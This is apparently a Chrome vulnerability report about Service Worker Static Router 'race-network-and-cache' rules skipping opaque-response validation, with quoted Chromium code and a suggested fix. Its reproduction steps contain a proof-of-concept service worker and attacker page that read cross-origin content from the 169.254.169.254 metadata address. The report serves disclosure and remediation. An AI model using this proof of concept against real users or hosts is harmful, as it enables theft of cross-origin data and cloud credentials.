# Chrome VRP Report: Service Worker `race-network-and-cache` Static Router Bypasses Opaque Response Validation

## Summary

Chrome's Service Worker Static Router validation code checks for invalid opaque responses only when `matched_source_type == kCache`, but NOT when `matched_source_type == kRaceNetworkAndCache`. When the `race-network-and-cache` router source is used and the cache wins the race, the opaque response validation (gated behind `kServiceWorkerStaticRouterOpaqueCheck`) is entirely skipped — regardless of whether the feature flag is enabled or disabled. This is a logic bug: the validation condition was written to match only `kCache`, missing the equivalent case where a cache response is served via `kRaceNetworkAndCache`.

## Severity Assessment

- **Type**: CORS bypass logic bug / Validation bypass
- **User Interaction**: None (victim visits attacker page)
- **Preconditions**: Attacker controls a website with a service worker
- **Chrome Version**: All versions with Service Worker Static Router (Chrome 123+)
- **Flags Required**: None (bypasses the check regardless of flag state)
- **Compromised Renderer**: Not required
- **Platform**: All platforms

## Technical Root Cause

### 1. Validation only checks for `kCache`, not `kRaceNetworkAndCache`

**`content/browser/service_worker/service_worker_main_resource_loader.cc:903-935`**:
```cpp
// Lines 903-906 enter this block for BOTH kCache and kRaceNetworkAndCache
if (IsMatchedRouterSourceType(
        network::mojom::ServiceWorkerRouterSourceType::kCache) ||
    IsMatchedRouterSourceType(network::mojom::ServiceWorkerRouterSourceType::
                                  kRaceNetworkAndCache)) {
  // ... timing info ...
  
  // Lines 915-916: Validation ONLY checks kCache
  if (response_head_->service_worker_router_info->matched_source_type ==
      network::mojom::ServiceWorkerRouterSourceType::kCache) {
    // validation code here
    if (!IsValidStaticRouterResponse(...) &&
        base::FeatureList::IsEnabled(
            features::kServiceWorkerStaticRouterOpaqueCheck)) {
      CommitCompleted(net::ERR_FAILED, "...");
      return;
    }
  }
  // When matched_source_type is kRaceNetworkAndCache: SKIPPED entirely
}
```

### 2. Same bug in subresource loader

**`content/renderer/service_worker/service_worker_subresource_loader.cc:1499-1513`**:
```cpp
// Block invalid responses from the static router.
if (response_head_->service_worker_router_info &&
    response_head_->service_worker_router_info->matched_source_type ==
        network::mojom::ServiceWorkerRouterSourceType::kCache) {
  // validation here
}
// kRaceNetworkAndCache: NOT checked
```

### 3. `actual_source_type` is set AFTER validation

At line 988-1004, the code correctly sets `actual_source_type = kCache` when `kRaceNetworkAndCache` was used and cache won. But this happens AFTER the validation at line 914-935 already checked `matched_source_type` and skipped validation.

## Reproduction Steps

### 1. Service Worker with `race-network-and-cache` routing

**sw.js**:
```javascript
self.addEventListener('install', async (event) => {
  event.waitUntil((async () => {
    const cache = await caches.open('exploit');
    // Fetch cross-origin resource as opaque
    const resp = await fetch('http://169.254.169.254/latest/meta-data/', 
                             { mode: 'no-cors' });
    await cache.put('/exfil', resp);
    self.skipWaiting();
  })());
});

self.addEventListener('activate', async (event) => {
  event.waitUntil((async () => {
    // Use race-network-and-cache instead of cache to bypass validation
    await self.registration.router.register([{
      condition: { urlPattern: "/exfil" },
      source: "race-network-and-cache"
    }]);
    await self.clients.claim();
  })());
});
```

### 2. Attacker page

**index.html**:
```html
<script>
async function exploit() {
  await navigator.serviceWorker.register('/sw.js');
  await navigator.serviceWorker.ready;
  await new Promise(r => setTimeout(r, 2000));
  
  // The static router will race network vs cache
  // For /exfil, no real server responds, so cache wins the race
  // The opaque response is served without validation
  const resp = await fetch('/exfil');
  const text = await resp.text();
  // Cross-origin content is now readable!
  console.log('Leaked:', text);
}
exploit();
</script>
```

### 3. Expected vs Actual

**Expected**: Even if `kServiceWorkerStaticRouterOpaqueCheck` is eventually enabled by default, `race-network-and-cache` should be subject to the same validation as `kCache` when the cache wins.

**Actual**: Validation is skipped entirely for `kRaceNetworkAndCache` source type. The `matched_source_type` check at line 915 only matches `kCache`.

## Distinction from Existing `kServiceWorkerStaticRouterOpaqueCheck` Bug

The existing bug (crbug.com/495999481) is about the feature flag being disabled. **This is a separate logic bug**: even when the flag is enabled, `race-network-and-cache` router rules bypass the validation because the code condition only checks for `matched_source_type == kCache`.

When Chrome eventually enables `kServiceWorkerStaticRouterOpaqueCheck` by default (to fix the known issue), `race-network-and-cache` will remain unprotected due to this oversight.

## Suggested Fix

Change the validation condition to also cover `kRaceNetworkAndCache`:

```cpp
// In service_worker_main_resource_loader.cc:915
if (response_head_->service_worker_router_info->matched_source_type ==
        network::mojom::ServiceWorkerRouterSourceType::kCache ||
    response_head_->service_worker_router_info->matched_source_type ==
        network::mojom::ServiceWorkerRouterSourceType::kRaceNetworkAndCache) {
```

Or alternatively, check `actual_source_type` instead of `matched_source_type` (but this requires reordering the code to set `actual_source_type` before the validation).

Apply the same fix in `service_worker_subresource_loader.cc:1499`.

## References

- `content/browser/service_worker/service_worker_main_resource_loader.cc:903-935`
- `content/renderer/service_worker/service_worker_subresource_loader.cc:1499-1513`
- `content/common/features.cc:709-710` (kServiceWorkerStaticRouterOpaqueCheck)
- crbug.com/495999481 (existing tracking for the feature-flag gating issue)
